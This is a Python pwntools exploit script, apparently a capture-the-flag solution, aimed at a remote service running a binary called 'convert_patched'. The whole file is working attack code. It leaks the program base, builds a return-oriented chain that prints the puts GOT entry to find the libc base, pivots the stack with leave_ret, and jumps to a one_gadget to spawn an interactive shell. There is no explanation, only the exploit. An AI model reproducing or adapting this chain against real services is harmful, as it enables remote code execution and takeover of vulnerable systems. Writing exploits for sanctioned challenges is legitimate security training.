from pwn import *

#r = gdb.debug("./convert_patched")
r = remote("34.143.130.87", 4001)

def add_chunk(t,action,data):
	r.send(str(t).encode().ljust(4,b'\0') + action + data)
	sleep(0.1)

r.recvuntil("\n")
leak = u64(r.recv(6).ljust(8,b'\0'))
base = leak - 0x1ada
context.log_level = 1

log.info("BASE ADDRESS: " + hex(base))
r.recvuntil("!\n")
pop_rdi = base + 0x0000000000001c0b
puts_plt = base + 0x1030
puts_got = base + 0x4018
pop_rsi_r15 = base + 0x0000000000001c09
main = base + 0x1ac1
read_plt = base + 0x1070
leave_ret = base + 0x0000000000001240
pop_rbp = base + 0x00000000000011b3
# base + 0x4058 + 0x50
add_chunk(1,b'htb\0',b'\0aaa' + p32(0x78+0x18) + b'A'*0x28)
add_chunk(1,b'htb\0',p64(base + 0x4500) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rsi_r15) + p64(base + 0x4500))
add_chunk(1,b'htb\0',b'\0CCCCCCC' + p64(pop_rbp) + p64(base + 0x4048 + 0x50) + p64(base + 0x1aff) + p64(leave_ret) + p64(base +0x4070))
add_chunk(0,b'htb\0',b'\0' + b'D'*0x2f)
r.recvline()
libc_leak = u64(r.recvline()[:-1].ljust(8,b'\0'))
libc_base = libc_leak - 0x6f6a0
log.info("LIBC BASE ADDRESS: " + hex(libc_base))

pop_rax = libc_base + 0x000000000003a738
one_gadget = libc_base + 0x45226

r.send(p64(base + 0x1aff) + p64(one_gadget) + p64(libc_base +0x453a0))

r.interactive()